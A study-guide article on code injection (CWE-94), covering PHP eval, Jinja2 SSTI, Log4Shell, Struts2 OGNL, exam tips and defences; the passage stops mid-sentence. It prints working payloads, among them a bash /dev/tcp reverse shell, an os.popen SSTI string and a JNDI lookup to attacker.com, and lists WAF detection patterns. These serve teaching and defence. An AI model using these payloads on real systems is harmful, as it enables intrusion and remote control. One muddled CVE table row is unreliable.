```markdown
---
domain: "application-security"
tags: [injection, code-execution, web-security, rce, owasp, cwe-94]
---
# Code Injection

**Code injection** (CWE-94) is an attack in which an adversary supplies malicious input that a vulnerable application passes to an **interpreter or runtime engine**, causing that engine to execute the attacker's code rather than (or in addition to) the intended program logic. It is a member of the broader [[Injection Attacks]] family alongside [[SQL Injection]], [[Command Injection]], and [[LDAP Injection]], but is distinguished by targeting a **code-evaluation context** — such as a scripting engine, expression language, or template renderer — rather than a database or OS shell. Successful exploitation typically results in [[Remote Code Execution (RCE)]], data exfiltration, or complete host compromise.

---

## Overview

Code injection exists because software developers must sometimes accept dynamic input and incorporate it into executable logic. Scripting languages like PHP, Python, and JavaScript expose functions — `eval()`, `exec()`, `compile()` — that accept strings and execute them as program code. When an application feeds user-controlled data into these functions without sanitization, the attacker's input becomes indistinguishable from legitimate program code. The interpreter has no intrinsic way to tell the difference; it simply executes what it receives.

The vulnerability class is catalogued under **OWASP A03:2021 – Injection** and **CWE-94: Improper Control of Generation of Code**. OWASP has ranked Injection in the top three of its Top 10 list for every edition since 2010, reflecting its persistent prevalence across languages, frameworks, and application types. Code injection in the narrow sense (runtime code evaluation) is distinct from SQL injection or OS command injection in that the payload targets the application's *own* scripting or expression layer, not an external subsystem. However, the underlying root cause — insufficient input validation and context-unaware output handling — is identical across the family.

Real-world consequences range from complete server compromise to supply-chain attacks. The 2021 **Log4Shell** vulnerability (CVE-2021-44228) demonstrated how a single expression-injection flaw in a widely deployed logging library could expose hundreds of millions of systems to RCE, requiring only a specially crafted string in any logged field such as an HTTP `User-Agent` header. The 2017 **Struts2 OGNL injection** (CVE-2017-5638) was exploited in the **Equifax breach**, exposing 147 million consumer records. These incidents underscore that code injection is not a theoretical concern.

Beyond web applications, code injection appears in desktop applications that use embedded scripting engines (Lua, Python), mail systems that render template languages, data-science pipelines that `eval()` user-supplied formulas, and CI/CD infrastructure where pipeline definitions accept user input. The attack surface has expanded dramatically as expression languages and template engines have proliferated across the software stack.

---

## How It Works

### The Fundamental Mechanism

Every code injection attack follows the same structural pattern:

1. **Attacker identifies an injection point** — any application feature that accepts user input and passes it into a code-evaluation context.
2. **Attacker crafts a payload** — a string that, when interpreted, performs an attacker-chosen action.
3. **Application concatenates input into executable code** — without sanitization, escaping, or structural separation.
4. **The interpreter executes the combined code** — treating attacker data as trusted instructions.
5. **Attacker achieves intended effect** — reading files, spawning shells, exfiltrating data, pivoting to internal networks.

### PHP `eval()` — Classic Example

Consider the following vulnerable PHP snippet:

```php
<?php
// Vulnerable: user input fed directly into eval()
$operation = $_GET['op'];
eval("\$result = $operation;");
echo "Result: $result";
?>
```

A legitimate request:
```
GET /calc.php?op=2%2B2   →   $result = 2+2;   →   "Result: 4"
```

A malicious payload:
```
GET /calc.php?op=system('id')
```

PHP evaluates:
```php
$result = system('id');
```

The OS command `id` executes in the context of the web server process, returning:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

From here, an attacker can escalate: read `/etc/passwd`, write a webshell, establish a reverse shell:
```
op=system('bash+-i+>%26+/dev/tcp/10.10.10.1/4444+0>%261')
```

### Server-Side Template Injection (SSTI)

Template engines (Jinja2, Twig, Freemarker, Velocity) evaluate expressions embedded in templates. When user input is rendered *as* a template rather than *into* a template, injection occurs.

**Jinja2 (Python/Flask) example:**

Vulnerable code:
```python
from flask import Flask, request, render_template_string
app = Flask(__name__)

@app.route("/greet")
def greet():
    name = request.args.get("name", "guest")
    # Vulnerable: user input used as template source
    return render_template_string(f"Hello, {name}!")
```

Payload to test for SSTI:
```
GET /greet?name={{7*7}}
```
If the response shows `Hello, 49!`, the template engine evaluated the expression. An attacker then escalates:
```
GET /greet?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### Log4Shell (CVE-2021-44228) — Expression Language Injection

Apache Log4j 2's message lookup feature evaluated JNDI expressions embedded in log messages:

```
${jndi:ldap://attacker.com/exploit}
```

When a Java application logged a user-controlled string containing this payload — from an HTTP header, login field, or any logged parameter — Log4j would:
1. Parse the `${...}` expression.
2. Make an outbound LDAP request to `attacker.com`.
3. Receive a response directing it to load a remote Java class.
4. Instantiate and execute the attacker's class within the JVM.

No authentication was required. The attack worked over any protocol that resulted in log data, including HTTP, SMTP, and DNS.

### OGNL Injection (Struts2, CVE-2017-5638)

Apache Struts 2 used the **Object-Graph Navigation Language (OGNL)** expression language extensively. A malformed `Content-Type` header was passed into an error message that was then evaluated as an OGNL expression:

```
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...@java.lang.Runtime@getRuntime().exec('id')}
```

The Struts2 framework evaluated the expression, executing the OS command. This exact mechanism was used in the Equifax breach.

### Deserialization as Code Injection

[[Insecure Deserialization]] (CWE-502) is a related vector where serialized objects — Java, PHP, Python pickle — are deserialized with attacker-controlled data, triggering code execution through gadget chains. While technically distinct, it produces the same result: attacker-controlled code executes in the application's runtime.

---

## Key Concepts

- **Injection Point**: Any location in an application where user-controlled input flows into an interpreter. Common injection points include URL parameters, HTTP headers, form fields, file upload names, and API request bodies.
- **Interpreter / Runtime**: The engine that evaluates the injected code. In code injection, this is the application's own language runtime (PHP engine, JVM, Python interpreter, template engine) — distinguishing it from command injection, which targets the OS shell, or SQL injection, which targets a database engine.
- **CWE-94 (Improper Control of Generation of Code)**: The canonical Common Weakness Enumeration identifier for code injection. CWE-94 is a child of CWE-20 (Improper Input Validation) and parent of CWE-95 (eval Injection) and CWE-96 (Static Code Injection).
- **Server-Side Template Injection (SSTI)**: A specific subtype of code injection where user input is rendered as a template by engines such as Jinja2, Twig, Freemarker, or Pebble, allowing expression evaluation and, ultimately, arbitrary code execution.
- **Expression Language (EL) Injection**: Injection into expression languages used by Java EE frameworks (OGNL, SpEL, EL), Python templates, or JavaScript template literals. OGNL injection powered the Equifax breach; SpEL injection has appeared in Spring Framework vulnerabilities.
- **Gadget Chain**: In deserialization-based code injection, a sequence of existing classes whose methods, when invoked during object reconstruction, form a chain that ultimately executes attacker-controlled commands. Libraries like Apache Commons Collections have historically provided exploitable gadgets in Java environments.
- **Sandboxing**: A defensive mechanism that constrains what code executing within the interpreter can do — limiting filesystem access, network access, and subprocess creation. Template engines like Jinja2 offer a `SandboxedEnvironment` for exactly this purpose, though sandbox escapes are an ongoing area of research.

---

## Exam Relevance

**SY0-701 Domain Mapping**: Code injection appears primarily under **Domain 2.0 – Threats, Vulnerabilities, and Mitigations**, specifically objectives **2.3** (types of attacks: application attacks) and **2.4** (application vulnerabilities). Defenses map to **Domain 4.0 – Security Operations** (input validation) and **Domain 3.0** (secure software development).

**Distinguishing injection types on the exam** is a frequently tested skill. Use this decision tree:

| Target of Injection | Attack Type |
|---|---|
| Database engine (MySQL, MSSQL) | [[SQL Injection]] |
| Operating system shell (`/bin/sh`, `cmd.exe`) | [[Command Injection]] |
| Application's own code interpreter (`eval`, template engine, EL) | **Code Injection** |
| Browser DOM / HTML renderer | [[Cross-Site Scripting (XSS)]] |
| LDAP directory | [[LDAP Injection]] |

**Common question patterns**:
- A question presents a PHP application using `eval()` on user input and asks which attack is possible — answer: **code injection** (not command injection, which would be `system()` or `exec()` passing to a shell).
- A question describes an attacker sending `{{7*7}}` to a web form and the application returning `49` — answer: **SSTI / code injection**.
- Defenses listed in answer choices: prefer **input validation** and **allow-listing** over blacklisting for injection defenses. The exam consistently favors allow-listing (only permit known-good characters) over denylist/blacklist approaches.

**Gotchas**:
- Log4Shell is sometimes categorized in exam prep materials as "command injection" or "JNDI injection" — technically it is **expression language injection**, a form of code injection. Know it either way.
- **Parameterized queries** defend against SQL injection, not code injection directly. The analogous defense for code injection is **avoiding dynamic evaluation** entirely, not parameterization.
- Deserialization vulnerabilities may appear in questions about code injection or as their own category; either framing is acceptable — focus on the concept (untrusted data executed as code).

---

## Security Implications

### Vulnerabilities and Attack Vectors

Code injection vulnerabilities arise from several root causes:
- **Dynamic code evaluation**: Use of `eval()`, `exec()`, `compile()` (Python), `eval()` (PHP/JavaScript), `ScriptEngine.eval()` (Java) with user input.
- **Unsafe template rendering**: Passing user strings as template *source* rather than template *data*.
- **Expression language exposure**: Frameworks that process user-controlled strings through OGNL, SpEL, EL, or MVEL evaluators.
- **Insecure deserialization**: Accepting serialized objects from untrusted sources (Java `ObjectInputStream`, PHP `unserialize()`, Python `pickle.loads()`).

### Notable CVEs and Incidents

| CVE | Product | Mechanism | Impact |
|---|---|---|---|
| **CVE-2021-44228** | Apache Log4j 2 (Log4Shell) | JNDI/LDAP expression lookup in log messages | RCE on any Java app using Log4j; estimated 3 billion devices affected |
| **CVE-2017-5638** | Apache Struts 2 | OGNL expression injection via `Content-Type` header | RCE; exploited in **Equifax breach** (147M records) |
| **CVE-2019-2725** | Oracle WebLogic Server | Java deserialization via T3/IIOP protocol (port 7001) | Unauthenticated RCE; widely exploited by ransomware actors |
| **CVE-2022-22965** | Spring Framework (Spring4Shell) | Data binding + ClassLoader manipulation via HTTP parameters | RCE on Spring MVC/WebFlux apps running on JDK 9+ with Tomcat |
| **CVE-2023-44487** | Not injection directly, but many SSTI CVEs were disclosed in 2023 in Confluence (CVE-2023-22527) | OGNL injection | Unauthenticated RCE; actively exploited by threat actors including nation-state groups |

### Detection

- **WAF signatures**: Rules matching `eval(`, `${`, `#{`, `{{`, `<%=`, `Runtime.exec`, `ProcessBuilder`, JNDI URI patterns (`jndi:ldap://`, `jndi:rmi://`).
- **SAST tools**: Static analysis (Semgrep, SonarQube, Checkmarx) flags calls to `eval()`, `unserialize()`, template rendering with user input.
- **DAST / fuzzing**: Tools like Burp Suite Pro, OWASP ZAP, and Nuclei include SSTI and EL injection detection modules.
- **Runtime Application Self-Protection (RASP)**: Agents like Sqreen, Contrast Security, or OpenRASP instrument the application runtime and block injection payloads at execution time.
- **Log anomalies**: Outbound LDAP/RMI connections from application servers, unusual child process spawning from web server processes (Apache spawning `bash`), and DNS queries to unexpected external resolvers are all behavioral indicators.

---

## Defensive Measures

### Primary Defenses

1. **Eliminate dynamic evaluation**: The strongest defense is to never pass user-controlled input to `eval()`, `exec()`, template source renderers, or expression language evaluators. Refactor code to use static templates and lookup tables instead.

2. **Input validation — allow-listing**: Define and enforce the exact set of characters, formats, and lengths acceptable for each input field. Reject anything outside the allow-list before it reaches any interpreter. Use server-side validation; never rely solely on client-side checks.

3. **Contextual output encoding**: Ensure user data passed into templates is treated as *data*, not *code*. In Jinja2, always use `render_template()` (which auto-escapes) rather than `render_template_string()` with raw user input. In Freemarker, disable `?eval` and `?interpret` methods.

4. **Sandboxing and least privilege**: Run application servers as low-privilege users (`www-data`, not `root`). Use OS-level sandboxing (SELinux, AppArmor, seccomp) to restrict what the process can execute. For Java, use a `SecurityManager` (legacy) or module-layer restrictions. For Python Jinja2, use `SandboxedEnvironment`.

5. **Disable dangerous deserialization**: Avoid deserializing untrusted data. If deserialization is required, use a serialization format that cannot carry type information (JSON without polymorphic type handling) rather than native Java/PHP/Python serialization. Implement deserialization filters (`ObjectInputFilter` in Java).

6. **Patch and update aggressively**: Log4Shell and Spring4Shell were exploited within hours of disclosure. Maintain an accurate software bill of materials ([[SBOM]]) and subscribe to vulnerability feeds (NVD, vendor advisories) for all third-party libraries.

### Specific Tool Configurations

- **Web Application Firewall (WAF)**: ModS